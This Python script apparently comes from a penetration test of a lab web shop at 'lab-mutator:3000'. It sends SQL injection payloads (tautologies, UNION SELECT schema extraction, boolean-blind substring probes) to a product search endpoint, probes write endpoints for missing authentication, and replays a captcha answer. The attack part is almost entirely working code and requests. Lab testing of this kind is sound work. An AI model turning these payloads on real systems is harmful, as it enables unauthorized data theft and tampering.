#!/usr/bin/env python3
"""Focused tests: SecurityAnswers auth gap, deep SQLi extraction, final captcha shot,
and other POST writes without auth."""
import json, sys, urllib.request, urllib.error, urllib.parse, time

TARGET = "http://lab-mutator:3000"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/workspace/reports/focus2.json"

def req(path, method="GET", headers=None, body=None):
    h = dict(headers or {})
    h["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    data = body.encode() if isinstance(body, str) else body
    r = urllib.request.Request(TARGET + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", "replace")
        except Exception:
            body = ""
        return e.code, dict(e.headers), body
    except Exception as e:
        return None, {}, str(e)

def dump(label, cases):
    out = {"label": label, "cases": []}
    for name, (st, h, b) in cases:
        out["cases"].append({
            "name": name, "status": st,
            "content_type": h.get("Content-Type", ""),
            "cors": h.get("Access-Control-Allow-Origin", ""),
            "body": b[:500].replace("\n", " "),
            "body_length": len(b)
        })
    return out

results = []

# ---- /api/SecurityAnswers/ auth gap ----
sa_cases = [
    ("GET /api/SecurityAnswers/ (auth-gated read?)", req("/api/SecurityAnswers/")),
    ("POST with test payload", req("/api/SecurityAnswers/", "POST",
               {"Content-Type": "application/json"},
               json.dumps({"questionId": 7, "answer": "Fluffy", "email": "testuser@juice-sh.op"}))),
    ("POST with empty object", req("/api/SecurityAnswers/", "POST",
               {"Content-Type": "application/json"}, json.dumps({}))),
    ("POST same payload again (idempotency)", req("/api/SecurityAnswers/", "POST",
               {"Content-Type": "application/json"},
               json.dumps({"questionId": 7, "answer": "Fluffy", "email": "testuser@juice-sh.op"}))),
]
results.append(dump("securityanswers_auth_gap", sa_cases))

# ---- SQLi: proper SQLite comment syntax + extraction ----
sqli_cases = [
    ("GET q=%27%20AND%201=2--%20", req("/rest/products/search?q=%27%20AND%201=2--%20")),
    ("GET q=%27%20AND%201=1--%20", req("/rest/products/search?q=%27%20AND%201=1--%20")),
    ("GET q=%27%20AND%201=2/**/", req("/rest/products/search?q=%27%20AND%201=2/**/")),
    ("GET q=%27%20OR%201=1--%20", req("/rest/products/search?q=%27%20OR%201=1--%20")),
    ("GET q=%27%20UNION%20SELECT%201,2,3,4--%20", req("/rest/products/search?q=%27%20UNION%20SELECT%201,2,3,4--%20")),
    ("GET q=%27%20UNION%20SELECT%201,2,3,name--%20", req("/rest/products/search?q=%27%20UNION%20SELECT%201,2,3,name--%20")),
    ("GET q=%27%20UNION%20SELECT%20NULL,sql,2,4--%20", req("/rest/products/search?q=%27%20UNION%20SELECT%20NULL,sql,2,4--%20")),
    ("GET q=%25", req("/rest/products/search?q=%25")),
    ("GET q=b", req("/rest/products/search?q=b")),  # expected partial (no 'b' in most names? check)
]
results.append(dump("sqli_sqlite_comments_and_union", sqli_cases))

# ---- Final fresh-shot captcha attempt ----
cap_cases = []
status, h, b = req("/rest/captcha")
j = json.loads(b)
cap_cases.append(("GET /rest/captcha", (status, h, b)))
cap_cases.append(("POST same id+expr+answer (single-shot)",
    req("/api/Feedbacks/", "POST", {"Content-Type": "application/json"},
        json.dumps({"captchaId": j["captchaId"], "captcha": j["captcha"], "answer": j["answer"]})
    )))
cap_cases.append(("GET fresh second captcha", req("/rest/captcha")))
results.append(dump("captcha_single_shot", cap_cases))

# ---- Additional POST-write endpoints without auth check ----
more_post = ["/api/Feedbacks/","/api/Complaints/","/api/Addresss/","/api/Cards/","/api/Deliverys/",
             "/api/Quantitys/","/api/Recycles/","/api/Hints/"]
more_cases = []
for p in more_post:
    s, h, b = req(p, "POST", {"Content-Type": "application/json"}, json.dumps({"x":1}))
    more_cases.append((p, (s, h.get("Content-Type",""), b[:80])))
results.append({"label": "more_post_endpoints", "routes": more_cases})

# ---- /rest/products/search with boolean difference to infer DB info ----
bool_cases = [
    ("GET q=%27%20AND%20%27a%27=%27a--%20", req("/rest/products/search?q=%27%20AND%20%27a%27=%27a--%20")),
    ("GET q=%27%20AND%20substr(name,1,1)=%27A%27--%20", req("/rest/products/search?q=%27%20AND%20substr(name,1,1)=%27A%27--%20")),
]
results.append(dump("sqli_boolean_difference", bool_cases))

with open(OUT, "w") as f:
    json.dump(results, f, indent=1)
print(f"Wrote {OUT}", file=sys.stderr)
